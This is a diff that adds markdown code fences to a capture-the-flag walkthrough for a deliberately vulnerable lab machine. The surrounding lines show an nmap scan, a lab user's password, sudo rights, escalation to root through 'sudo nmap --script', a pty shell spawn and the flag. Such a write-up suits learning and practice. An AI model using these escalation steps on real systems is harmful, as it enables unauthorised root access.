@@ -9,6 +9,7 @@
 ----------------------------------------------------------------
 # nmap scan ()
 ----------------------------------------------------------------
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
@@ -58,10 +59,11 @@ Things to do:
 - Add new user: graham - GSo7isUM1D4 - done
 - Apply for the OSCP course
 - Buy new laptop for Sarah's replacement
-
+```
 ----------------------------------------------------------------
 ssh login 
 ----------------------------------------------------------------
+```
 graham:GSo7isUM1D4
 -> sudo -l
 (jens) NOPASSWD: /home/jens/backups.sh
@@ -81,10 +83,11 @@ sudo nmap --script=$TF
 
 python -c 'import pty;pty.spawn("/bin/bash")'
 congrats you got root
-
+```
 ----------------------------------------------------------------
 # flag
 ----------------------------------------------------------------
+```
 -> cat theflag.txt
 
 
@@ -101,3 +104,4 @@ who have provided feedback, and who have taken time to complete these little
 challenges.
 
 If you enjoyed this CTF, send me a tweet via @DCAU7.
+```
